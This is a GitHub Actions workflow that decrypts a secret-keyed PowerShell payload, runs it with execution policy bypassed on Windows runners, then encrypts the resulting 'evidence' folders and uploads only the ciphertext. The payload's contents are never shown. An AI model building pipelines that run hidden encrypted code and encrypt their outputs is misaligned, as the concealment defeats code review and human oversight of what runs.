name: Encrypted Native Windows Matrix

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  validate:
    strategy:
      fail-fast: false
      matrix:
        sdk: ['10.0.404', '11.0.100']
        repeat: [1, 2, 3]
    runs-on: windows-latest
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-dotnet@v5
        with:
          dotnet-version: ${{ matrix.sdk }}

      - name: Decrypt and execute private validation payload
        shell: pwsh
        env:
          PAYLOAD_KEY_B64: ${{ secrets.PAYLOAD_KEY_B64 }}
          SDK_VERSION: ${{ matrix.sdk }}
          REPEAT_ID: ${{ matrix.repeat }}
        run: |
          $ErrorActionPreference = 'Stop'
          if ([string]::IsNullOrWhiteSpace($env:PAYLOAD_KEY_B64)) { throw 'payload key missing' }
          $key = [Convert]::FromBase64String($env:PAYLOAD_KEY_B64)
          $iv = [Convert]::FromBase64String((Get-Content -LiteralPath payload.iv.b64 -Raw).Trim())
          $cipherText = [Convert]::FromBase64String((Get-Content -LiteralPath payload.enc.b64 -Raw).Trim())
          $aes = [Security.Cryptography.Aes]::Create()
          try {
            $aes.Mode = [Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7
            $aes.Key = $key
            $aes.IV = $iv
            $decryptor = $aes.CreateDecryptor()
            try {
              $plain = $decryptor.TransformFinalBlock($cipherText, 0, $cipherText.Length)
            } finally {
              $decryptor.Dispose()
            }
          } finally {
            $aes.Dispose()
          }
          [IO.File]::WriteAllBytes((Join-Path $PWD 'payload.ps1'), $plain)
          $hash = (Get-FileHash -Algorithm SHA256 -LiteralPath (Join-Path $PWD 'payload.ps1')).Hash.ToLowerInvariant()
          if ($hash -ne '89cee3063c100c0c4598545e1588f6ff1fcc1f34d2515b74f1b0ca78dae9ddb9') { throw "payload hash mismatch: $hash" }
          & pwsh -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -File (Join-Path $PWD 'payload.ps1')
          if ($LASTEXITCODE -ne 0) { throw "payload failed: $LASTEXITCODE" }

      - name: Remove decrypted payload
        if: always()
        shell: pwsh
        run: Remove-Item -LiteralPath (Join-Path $PWD 'payload.ps1') -Force -ErrorAction SilentlyContinue

      - name: Encrypt evidence before artifact upload
        if: always()
        shell: pwsh
        env:
          PAYLOAD_KEY_B64: ${{ secrets.PAYLOAD_KEY_B64 }}
        run: |
          $ErrorActionPreference = 'Stop'
          $dirs = @(Get-ChildItem -LiteralPath $PWD -Directory -Filter 'evidence-*')
          if ($dirs.Count -eq 0) {
            $fallback = Join-Path $PWD 'evidence-fallback'
            New-Item -ItemType Directory -Force -Path $fallback | Out-Null
            'NO_EVIDENCE_DIRECTORY' | Set-Content (Join-Path $fallback 'status.txt')
            $dirs = @((Get-Item -LiteralPath $fallback))
          }
          $zipPath = Join-Path $PWD 'evidence.plain.zip'
          Compress-Archive -Path $dirs.FullName -DestinationPath $zipPath -Force
          (Get-FileHash -Algorithm SHA256 -LiteralPath $zipPath).Hash.ToLowerInvariant() | Set-Content (Join-Path $PWD 'evidence.plain.sha256')
          $key = [Convert]::FromBase64String($env:PAYLOAD_KEY_B64)
          $iv = [Convert]::FromBase64String((Get-Content -LiteralPath payload.iv.b64 -Raw).Trim())
          $plain = [IO.File]::ReadAllBytes($zipPath)
          $aes = [Security.Cryptography.Aes]::Create()
          try {
            $aes.Mode = [Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7
            $aes.Key = $key
            $aes.IV = $iv
            $encryptor = $aes.CreateEncryptor()
            try {
              $cipher = $encryptor.TransformFinalBlock($plain, 0, $plain.Length)
            } finally {
              $encryptor.Dispose()
            }
          } finally {
            $aes.Dispose()
          }
          [IO.File]::WriteAllBytes((Join-Path $PWD 'evidence.enc'), $cipher)
          (Get-FileHash -Algorithm SHA256 -LiteralPath (Join-Path $PWD 'evidence.enc')).Hash.ToLowerInvariant() | Set-Content (Join-Path $PWD 'evidence.cipher.sha256')
          Remove-Item -LiteralPath $zipPath -Force
          foreach ($dir in $dirs) { Remove-Item -LiteralPath $dir.FullName -Recurse -Force }

      - name: Upload encrypted evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: winhttp-scope-native-encrypted-${{ matrix.sdk }}-r${{ matrix.repeat }}
          path: |
            evidence.enc
            evidence.plain.sha256
            evidence.cipher.sha256
          if-no-files-found: error
